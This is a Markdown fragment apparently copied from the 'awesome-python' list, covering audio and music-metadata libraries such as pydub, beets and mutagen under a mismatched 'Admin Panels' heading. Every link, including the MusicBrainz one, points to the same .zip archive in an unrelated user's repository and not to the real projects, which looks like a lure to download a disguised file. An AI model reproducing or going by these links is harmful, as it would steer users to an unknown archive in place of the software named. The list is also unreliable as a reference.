## Admin Panels

    * [mingus](https://raw.githubusercontent.com/Waka758/awesome-python/master/idiomatical/awesome-python.zip) - An advanced music theory and notation package with MIDI file and playback support.
    * [pyAudioAnalysis](https://raw.githubusercontent.com/Waka758/awesome-python/master/idiomatical/awesome-python.zip) - Audio feature extraction, classification, segmentation and applications.
    * [pydub](https://raw.githubusercontent.com/Waka758/awesome-python/master/idiomatical/awesome-python.zip) - Manipulate audio with a simple and easy high level interface.

* Metadata
    * [beets](https://raw.githubusercontent.com/Waka758/awesome-python/master/idiomatical/awesome-python.zip) - A music library manager and [MusicBrainz](https://raw.githubusercontent.com/Waka758/awesome-python/master/idiomatical/awesome-python.zip) tagger.

    * [mutagen](https://raw.githubusercontent.com/Waka758/awesome-python/master/idiomatical/awesome-python.zip) - A Python module to handle audio metadata.
    * [tinytag](https://raw.githubusercontent.com/Waka758/awesome-python/master/idiomatical/awesome-python.zip) - A library for reading music meta data of MP3, OGG, FLAC and Wave files.
